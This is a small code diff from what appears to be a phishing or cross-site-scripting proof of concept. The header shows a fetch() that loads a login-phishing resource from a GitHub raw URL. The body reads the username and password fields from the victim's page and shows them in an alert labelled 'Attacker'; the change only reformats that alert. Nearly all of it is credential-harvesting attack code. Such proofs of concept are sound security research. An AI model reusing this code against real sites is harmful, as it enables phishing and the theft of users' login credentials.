@@ -8,7 +8,7 @@ fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/login-phis
 
     let user = document.querySelector('#username-1').innerText
     let pass = document.querySelector('#react-aria-1').value
-    alert('==>[ Attacker ]<==\n[+]=> Your email: ' + user + "\n[+]=>Your password: " + pass);
+    alert('====>[ Attacker ]<====\n[+]=> Your email: ' + user + "\n[+]=> Your password: " + pass);
 
     return;
   }, true);
